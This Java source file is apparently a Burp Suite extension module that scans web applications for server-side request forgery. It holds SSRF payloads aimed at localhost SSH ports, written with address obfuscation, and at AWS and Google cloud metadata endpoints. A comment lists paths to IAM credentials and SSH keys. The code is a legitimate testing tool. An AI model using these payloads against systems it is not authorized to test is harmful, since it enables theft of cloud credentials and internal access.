package burp.j2ee.issues.impl;


import static burp.HTTPMatcher.getMatches;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


/**
 * 
 * SSRF Scanner
 * 
 * 
 * Supported SSRF Tests:
 *  - AWS Cloud
 *  - Google Cloud
 *  - Generic blind SSRF using Collaborator 
 * 
 * 
 */
public class SSRFScanner implements IModule {

    private static final String TITLE = "SSRF Scanner";
    private static final String DESCRIPTION = "J2EEscan identified a potential SSRF vulnerability";

    private static final String SSRF_REMEDY = "Execute a code review activity to mitigate the SSRF vulnerability<br />"
            + "<b>References</b>:<br /><br />"
            + "https://cwe.mitre.org/data/definitions/918.html<br />";

    private PrintWriter stderr;
    private static final byte[] GREP_STRING = "OpenSSH".getBytes();
    private static final List<byte[]> SSRF_INJECTION_TESTS = Arrays.asList(
            "gopher://localhost:22/".getBytes(),
            "http://[::]:22/".getBytes(),
            "ftp://[::]:22/".getBytes(),
            "ftp://localhost:22/".getBytes(),
            "ftp://0.0.0.0:22/".getBytes(),
            "ftp://0177.0000.0000.0001:22".getBytes(),
            "ftp://0x7f.1:22/".getBytes(),
            "http://spoofed.burpcollaborator.net:22/".getBytes()
    );

    /**
     *
     * Source AWS
     * http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
     *
     * http://169.254.169.254/latest/user-data
     * http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLENAME]
     * http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLENAME] 
     * http://169.254.169.254/latest/meta-data/ami-id
     * http://169.254.169.254/latest/meta-data/reservation-id
     * http://169.254.169.254/latest/meta-data/hostname
     * http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
     * http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
     *
     * # AWS - Dirs http://169.254.169.254/
     * http://169.254.169.254/latest/meta-data/
     * http://169.254.169.254/latest/meta-data/public-keys/
     *
     */
    private static final Map<byte[], Pattern> SSRF_CLOUD_INJECTION_TESTS = new HashMap<byte[], Pattern>() {
        {
            put("http://169.254.169.254/latest/meta-data/".getBytes(), Pattern.compile("identity-credentials", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
            put("http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token".getBytes(), Pattern.compile("token_type", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
        
        }
    };

    
    
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();

        stderr = new PrintWriter(callbacks.getStderr(), true);

        for (byte[] INJ_TEST : SSRF_INJECTION_TESTS) {

            // make a request containing our injection test in the insertion point
            byte[] checkRequest = insertionPoint.buildRequest(INJ_TEST);
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

            try {

                // look for matches
                byte[] response = checkRequestResponse.getResponse();
                List<int[]> matches = getMatches(response, GREP_STRING, helpers);
                if (matches.size() > 0) {

                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            checkRequestResponse,
                            TITLE,
                            DESCRIPTION,
                            SSRF_REMEDY,
                            Risk.Medium,
                            Confidence.Tentative
                    ));

                    return issues;
                }

            } catch (Exception ex) {
                stderr.println(ex);
            }
        }

        // Cloud SSRF checks
        Set<byte[]> SSRF_CLOUD_INJ_SET = SSRF_CLOUD_INJECTION_TESTS.keySet();

        for (byte[] cloudInjectionTest : SSRF_CLOUD_INJ_SET) {

            // make a request containing our injection test in the insertion point
            byte[] checkRequest = insertionPoint.buildRequest(cloudInjectionTest);
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

            try {

                // look for matches
                byte[] responseCloud = checkRequestResponse.getResponse();
                String responseCloudStringified = helpers.bytesToString(responseCloud);

                Pattern detectionRule = SSRF_CLOUD_INJECTION_TESTS.get(cloudInjectionTest);

                Matcher matcher;
                matcher = detectionRule.matcher(responseCloudStringified);
                if (matcher.find()) {

                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            checkRequestResponse,
                            TITLE,
                            DESCRIPTION + "<br /> Detected a potential interaction with the cloud infrastructure"
                            + "detected string in response <b> "
                            + responseCloudStringified + "</b>",
                            SSRF_REMEDY,
                            Risk.Medium,
                            Confidence.Tentative
                    ));

                    return issues;
                }

            } catch (Exception ex) {
                stderr.println(ex);
            }
        }

        return issues;
    }
}
